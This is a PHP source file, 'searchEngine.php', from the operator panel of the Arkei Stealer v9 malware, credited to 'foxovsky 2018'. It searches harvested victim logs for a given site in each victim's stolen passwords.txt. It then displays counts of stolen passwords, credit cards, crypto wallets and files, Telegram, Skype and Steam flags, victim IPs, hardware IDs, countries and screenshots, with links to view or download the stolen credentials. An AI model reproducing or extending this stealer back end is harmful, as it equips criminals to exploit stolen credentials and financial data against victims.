<?php
/*
* -------------------------------------------------------------
*								_        _ 
*					 /\        | |      (_)
*					/  \   _ __| | _____ _ 
*				   / /\ \ | '__| |/ / _ \ |
*				  / ____ \| |  |   <  __/ |
*				 /_/    \_\_|  |_|\_\___|_|
*
*
*                    Arkei Stealer v9
*                   (x) foxovsky 2018
*
* -------------------------------------------------------------
* [searchEngine.php]
*    Search engine
*/

error_reporting(0);

function convertToReadableSize($size)
{
  $base = log($size) / log(1024);
  $suffix = array("", " KB", " MB", " GB", " TB");
  $f_base = floor($base);
  return round(pow(1024, $base - floor($base)), 1) . $suffix[$f_base];
}

// ---------------------------------------------------------------------------------------
// SearchEngine
//
// Engine init point
// ---------------------------------------------------------------------------------------
function SearchEngine($query, $config)
{	
	$logsArray;
	$logsFound = 0;
	
	$database = mysqli_connect($config["db_server"], $config["db_user"], $config["db_password"], $config["db_name"]);
	if($database)
	{
		$site = $query;
		$logs = $database->query("SELECT * FROM `logs` ORDER BY `id` DESC LIMIT 1000;");
		
		while ($log = $logs->fetch_assoc())
		{
			$zip = new ZipArchive;
			$reading = "";
					
			if ($zip->open('../'.$config["logs_folder"].'/'. $log["user"] .'') === TRUE) 
			{
				$reading = $zip->getFromName("/passwords.txt");
				$zip->close();
				
				$reading = nl2br($reading);
				
				$pos = stripos($reading, $site);
						
				if ($pos !== false)
				{
				?>		
				<tr>
										<?
										switch($log["status"])
										{
											case 0:
												?><td style="color: red;">Not checked</td><?
												break;
												
											case 1:
												?><td style="color: green;">Checked</td><?
												break;
										}
										?>
											<td><b>#<? echo $log["id"]; ?></b><br><? 
									$profileID = $log["profile"];
									$profile = $database->query("SELECT * FROM `profiles` WHERE `id`='$profileID';")->fetch_array();
					
									echo $profile["Name"];?></td>
											<td>
												<span style="display: inline;"><i class="mdi mdi-key"></i> <? echo $log["passwords"]; ?> </span>
												<span style="display: inline;"><i class="mdi mdi-credit-card"></i> <? echo $log["cc"]; ?> </span>
												<span style="display: inline;"><i class="mdi mdi-wallet"></i> <? echo $log["coins"]; ?> </span>
												<span style="display: inline;"><i class="mdi mdi-file"></i> <? echo $log["files"]; ?> </span>
												<?php
												
												if($log["telegram"] > 0)
												{
													?><span style="display: inline;"><i class="mdi mdi-telegram"></i> </span><?
												}
												
												if($log["skype"] > 0)
												{
													?><span style="display: inline;"><i class="mdi mdi-skype"></i> </span><?
												}
												
												if($log["steam"] > 0)
												{
													?><span style="display: inline;"><i class="mdi mdi-steam"></i> </span><?
												}
												
												?>
												<br>
												<?php
												
												$presets = $database->query("SELECT * FROM `presets`;");
												
												while ($preset = $presets->fetch_assoc())
												{
													$services = explode(";", $preset["services"]);
													
													foreach ($services as $service)
													{
														checkPreset($config, $log, $service, $preset["color"]);
													}
												}
												
												?>
											</td>
											<td><b><? echo $log["hwid"]; ?></b><br>
											<small class="u-block u-text-mute"><? echo $log["system"]; ?></small></td>
											<td><b><? echo $log["ip"]; ?></b><br><? echo $log["country"]; ?></td>
											<td><span style="display: inline;"><b><?
												
											$date_str = str_replace (' ','-', $log["date"]); 
											echo $date_str."</b></span><br>("; 
											
											$actual_date = new DateTime("now");
											$log_date = DateTime::createFromFormat('d/m/Y H:i:s', $log["date"]);
											$time_diff = $log_date->diff($actual_date);
											
											if($time_diff->format('%m') != 0)
											{
												echo $time_diff->format('%m')."m. ";
											}
											
											if($time_diff->format('%d') != 0)
											{
												echo $time_diff->format('%d')."d. ";
											}
											
											if($time_diff->format('%H') != 0)
											{
												echo $time_diff->format('%H')."h. ";
											}
											
											if($time_diff->format('%i') != 0)
											{
												echo $time_diff->format('%i')."m. ";
											}
											
											if($time_diff->format('%s') != 0)
											{
												echo $time_diff->format('%s')."s. ago)";
											}
												
											?></td>
											<td><img src="viewer.php?log=<? echo $log["user"]; ?>&file=/screenshot.jpg" height="80" /><br>
											<td>
												<div class="input-group">
													<input id="new_comment<? echo $log["id"]; ?>" class="form-control" title="<? echo $log["comment"]; ?>" value="<? echo $log["comment"]; ?>" placeholder="Leave a comment..." type="text">
													<div class="input-group-append">
														<button id="save_comment" onclick="UpdateComment(<? echo $log["id"]; ?>);" class="btn btn-success" type="button"><i class="mdi mdi-content-save"></i></button>
													</div>
												</div>
											</td>
											<td>
												<div class="btn-group">
													<button type="button" class="btn btn-info dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Actions</button>
													<div class="dropdown-menu">
														<a class="dropdown-item" target="_blank" href="viewer.php?log=<? echo $log["user"]; ?>">View online</a>
														<a class="dropdown-item" target="_blank" href="viewer.php?log=<? echo $log["user"]; ?>&file=/passwords.txt">View passwords</a>
														<div class="dropdown-divider"></div>
														<a style="cursor: pointer;" class="dropdown-item" onclick="SetChecked(<? echo $log["id"]; ?>);">Set checked</a>
														<div class="dropdown-divider"></div>
														<a class="dropdown-item" target="_blank" href="viewer.php?log=<? echo $log["user"]; ?>&action=download">Download</a>
														<div class="dropdown-divider"></div>
														<a class="dropdown-item" target="_blank" href="dashboard.php?action=delete&id=<? echo $log["id"]; ?>">Delete</a>
													</div>
												</div>
											</td>
										</tr>
					<?
					}
				} 
				else 
				{
					echo 'Error Reading File.';
				}
					
			}
			
		mysqli_close($database);
	}
}

?>